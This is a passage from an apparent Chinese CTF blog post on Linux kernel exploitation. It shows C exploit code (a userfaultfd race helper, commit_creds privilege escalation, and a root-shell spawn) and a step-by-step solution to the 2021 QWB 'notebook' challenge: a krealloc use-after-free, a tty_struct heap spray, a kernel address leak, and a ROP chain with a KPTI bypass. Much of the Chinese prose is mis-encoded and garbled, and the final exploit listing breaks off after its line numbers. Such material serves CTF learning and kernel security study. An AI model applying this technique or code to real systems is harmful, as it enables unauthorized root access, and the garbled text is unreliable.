class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><br><span class="hljs-type">void</span> * kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> kernel_offset = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">pthread_t</span> monitor_thread;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> * addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span>*))</span><br>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = pthread_create(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-comment">/* ------ kernel structure ------ */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">serial_icounter_struct</span>;</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> * (*<span class="hljs-title">lookup</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>,</span><br><span class="hljs-class">            <span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span>, <span class="hljs-title">int</span> <span class="hljs-title">idx</span>);</span><br>    <span class="hljs-type">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-type">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,<br>              <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);<br>    <span class="hljs-type">int</span>  (*put_char)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ch);<br>    <span class="hljs-type">void</span> (*flush_chars)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*write_room)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*chars_in_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-type">long</span> (*compat_ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-type">void</span> (*set_termios)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> ktermios * old);<br>    <span class="hljs-type">void</span> (*throttle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-type">void</span> (*unthrottle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-type">void</span> (*stop)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*start)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*hangup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span> (*break_ctl)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> state);<br>    <span class="hljs-type">void</span> (*flush_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*set_ldisc)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*wait_until_sent)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> timeout);<br>    <span class="hljs-type">void</span> (*send_xchar)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">char</span> ch);<br>    <span class="hljs-type">int</span> (*tiocmget)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span> (*tiocmset)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">set</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clear);<br>    <span class="hljs-type">int</span> (*resize)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> winsize *ws);<br>    <span class="hljs-type">int</span> (*set_termiox)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> termiox *tnew);<br>    <span class="hljs-type">int</span> (*get_icount)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                <span class="hljs-keyword">struct</span> serial_icounter_struct *icount);<br>    <span class="hljs-type">void</span> (*show_fdinfo)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> seq_file *m);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span><br>    <span class="hljs-type">int</span> (*poll_init)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> *options);<br>    <span class="hljs-type">int</span> (*poll_get_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line);<br>    <span class="hljs-type">void</span> (*poll_put_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> ch);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> *<span class="hljs-title">proc_fops</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="2021å¼ºç½‘æ¯notebook">2021å¼ºç½‘æ¯notebook</h3><h4 id="0x01åˆ†æ-2">0x01åˆ†æ</h4><h5 id="1-ä¿æŠ¤-2">1.ä¿æŠ¤</h5><p>å¼€å¯äº†kaslrï¼Œsmep/smap  (smepç”¨æˆ·ä»£ç ä¸å¯æ‰§è¡Œã€smapç”¨æˆ·æ•°æ®ä¸å¯è®¿é—®)</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/1-1684500912095.png" alt="1"></p><p>å¼€å¯äº†KPTI(Kernel page-table isolationå†…æ ¸é¡µè¡¨éš”ç¦»)</p><p><code>cat /sys/devices/system/cpu/vulnerabilities/*</code></p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2-1684500912096.png" alt="2"></p><h5 id="2-notebook-ko">2.notebook.ko</h5><p>æƒ¯ä¾‹çœ‹æ¼æ´é©±åŠ¨</p><h6 id="ä¸€-ioctl">ä¸€.ioctl</h6><p>èœå•é€‰é¡¹,add,gift,del,edit</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/3-1684500912096.png" alt="3"></p><p>addå‘slubç”³è¯·ä¸å¤§äº0x60çš„objectï¼Œ</p><p>æœ‰ä¸ªcopy_from_useræ‹·è´ç”¨æˆ·æ•°æ®åˆ°å†…æ ¸å…¨å±€å˜é‡name,è€Œè¿™ä¸ªnameä»…ç”¨ä½œäºæ‰“å°ï¼Œå¯ä»¥è®¤ä¸ºå‡ºé¢˜äººæ”¾åœ¨è¿™é‡Œæ˜¯ç»™æˆ‘ä»¬userfaultfdçš„ï¼Œè™½ç„¶åŠ äº†è¯»é”ï¼Œä¸è¿‡è¯»é”æ˜¯å¯ä»¥å¹¶å‘çš„</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/4-1684500912095.png" alt="4"></p><p>delåŠ äº†å†™é”ï¼Œä¹Ÿå°±æ˜¯ç‹¬å é”ï¼ˆå¯ä»¥ç”¨editçš„kreallocæ¥è¾¾åˆ°kfreeçš„ä½œç”¨ï¼Œedité‡Œæ²¡æœ‰å†™é”ï¼‰</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/5-1684500912096.png" alt="5"></p><p>editç”¨kreallocæ¥æ”¹å˜objectçš„å¤§å°ï¼Œè¿™é‡Œeditçš„newsizeæ²¡æœ‰é™åˆ¶ï¼Œå¯ä»¥ä»»æ„å¤§å°</p><p><strong>kreallocçš„ç‰¹æ€§ï¼š</strong></p><blockquote><p>kreallocçš„new_size=NULLï¼Œåˆ™kfreeé‡Šæ”¾object</p><p>kreallocçš„new_size&lt;ksï¼Œåˆ™æŒ‡é’ˆä¸å˜ï¼Œä»…è°ƒæ•´kasanç›‘æ§çš„åŒºåŸŸ</p><p>kreallocçš„new_size&gt;ks,åˆ™kfreeé‡Šæ”¾åŸæœ¬object,kmallocé‡æ–°ç”³è¯·æ–°object</p></blockquote><p>è¿™é‡Œä¹Ÿæœ‰ä¸ªå¤šä½™çš„copy_from_useråˆ°name</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/6-1684500912096.png" alt="6"></p><p>giftæŠŠç”³è¯·objectçš„åœ°å€ä¼ ç»™ç”¨æˆ·</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/7-1684500912096.png" alt="7"></p><h6 id="äºŒ-read-write">äºŒ.read&amp;write</h6><p>ä¸¤è€…éƒ½ç”¨äº†<code>_check_object_size</code>æ¥æ£€æŸ¥size,é˜²æ­¢äº†æº¢å‡º</p><p>readå°±æ˜¯è¯»objectæŒ‡å®šsizeå­—èŠ‚ç»™ç”¨æˆ·</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/8-1684500912096.png" alt="8"></p><p>writeå°±æ˜¯ä»ç”¨æˆ·åœ°å€æŒ‡å®šsizeå­—èŠ‚ç»™object</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/9-1684500912096.png" alt="9"></p><h4 id="0x02è§£æ³•1ï¼š-2">0x02è§£æ³•1ï¼š</h4><p>1.ç”±addå’Œedité…åˆç”³è¯·0x10ä¸ªTTY_STRUCT_SIZE(0x2e0)çš„object,ç„¶åéƒ½å»editä¸€ä¸ªæ›´å¤§çš„sizeï¼Œå€Ÿç”±kreallocçš„ç‰¹æ€§ä»¥è¾¾åˆ°kfreeï¼Œ</p><p>ç„¶ååœ¨ä¸‹é¢copy_from_userç”¨çš„æ˜¯æ³¨å†Œuserfaultfdçš„buf,éƒ½ä½¿å…¶æš‚åœï¼Œè¾¾åˆ°äº†uafçš„æ•ˆæœ</p><p>2.è¿›è¡Œheap spray,å¤šæ¬¡é‡å¤æ‰“å¼€/dev/ptmxï¼Œä»¥æ±‚å¤§æ¦‚ç‡åˆ†é…æŸä¸ªé‡Šæ”¾çš„objectä¸º tty_struct</p><blockquote><p>æ­¤å¤–åœ¨ read å’Œ write ä¸­éƒ½ä¼šç”¨ <code>_check_object_size</code> æ£€æŸ¥ size ä¸ buf å¤§å°æ˜¯å¦åŒ¹é…ï¼Œåœ¨ mynote_add å½“ä¸­é™åˆ¶äº† size åº”å½“ä¸å¤§äº 0x60ï¼Œè€Œæˆ‘ä»¬åœ¨ edit ä¸­çš„é‡Šæ”¾æ“ä½œä¹‹å‰ä¼šå°† size æ”¹æ‰ï¼Œè€ƒè™‘åˆ°åœ¨ mynote_add ä¸­å…ˆç”¨ copy_from_user æ‹·è´æ•°æ®åæ‰è°ƒç”¨ kmallocï¼Œæ•…è¿™é‡Œè¿˜æ˜¯å¯ä»¥æ–°å¼€ add çº¿ç¨‹è®© size åˆæ³•åé€šè¿‡ userfaultfd è®©å…¶å¡åœ¨è¿™é‡Œ</p></blockquote><p>3.å€Ÿç”±giftç»™çš„åœ°å€ï¼Œæ£€æŸ¥magicæ˜¯å¦ä¸º0x5401æ¥åˆ¤æ–­æ˜¯å¦åˆ†é…åˆ°tty_struct</p><p>4.é€šè¿‡ttyç»“æ„ä¸­çš„ tty_operationsæ³„éœ²å†…æ ¸åœ°å€</p><blockquote><p><strong>ptm_unix98_ops &amp;&amp; pty_unix98_ops</strong></p><p>åœ¨ ptmx è¢«æ‰“å¼€æ—¶å†…æ ¸é€šè¿‡ <code>alloc_tty_struct()</code> åˆ†é… tty_struct çš„å†…å­˜ç©ºé—´ï¼Œä¹‹åä¼šå°† tty_operations åˆå§‹åŒ–ä¸º<strong>å…¨å±€å˜é‡</strong> <code>ptm_unix98_ops</code> æˆ– <code>pty_unix98_ops</code>ï¼Œåœ¨è°ƒè¯•é˜¶æ®µæˆ‘ä»¬å¯ä»¥å…ˆå…³æ‰ kaslr å¼€ root ä» <code>/proc/kallsyms</code> ä¸­è¯»å–å…¶åç§»</p><p>å¼€å¯äº† kaslr çš„å†…æ ¸åœ¨å†…å­˜ä¸­çš„åç§»ä¾ç„¶ä»¥å†…å­˜é¡µä¸ºç²’åº¦ï¼Œæ•…æˆ‘ä»¬å¯ä»¥é€šè¿‡æ¯”å¯¹ tty_operations åœ°å€çš„ä½ä¸‰16è¿›åˆ¶ä½æ¥åˆ¤æ–­æ˜¯ ptm_unix98_ops è¿˜æ˜¯ pty_unix98_ops</p></blockquote><p>5.åŠ«æŒtty_opsçš„writeï¼Œé€šè¿‡ç¨‹åºè¿è¡Œé‚£æ—¶rdiå¯„å­˜å™¨å­˜çš„tty_structåœ°å€ï¼Œæ‰¾gadgetä¸‰æ¬¡æ ˆè¿ç§»</p><blockquote><p>ä»tty_ops-&gt;writeåˆ°tty_structåˆ°tty_opsåˆ°notes</p></blockquote><p>åœ¨noteså†™å…¥ropé“¾ï¼Œç”¨<code>commit_creds(init_cred)</code>å³å¯ï¼Œè¿”å›ç”¨æˆ·æ€ç”¨<code>swapgs_restore_regs_and_return_to_usermode</code>ï¼Œé¡ºä¾¿æŠŠKPTIè¿‡äº†</p><p>ï¼ˆå…¶å®æˆ‘æ„Ÿè§‰åªè¦ä¸¤æ¬¡æ ˆè¿ç§»å³å¯ï¼Œç›´æ¥tty_structåˆ°notesï¼Œä½†æ˜¯æˆ‘å°è¯•å¤šæ¬¡æ— æœï¼‰</p><p>5.æœ€åéå†writeæŸä¸ªåˆ†é…åˆ°tty_structçš„è®¾å¤‡æ¥è§¦å‘å³å¯</p><h5 id="Exp">Exp</h5><p>å› ä¸ºå·²ç»æ‡’å¾—ä¸€æ­¥æ­¥å†™äº†ï¼Œæ€»ä¹‹å°±æ˜¯åœ¨ç†è§£çš„åŸºç¡€ä¸Š(è‡ªè®¤ä¸º)å„ç§cv</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span 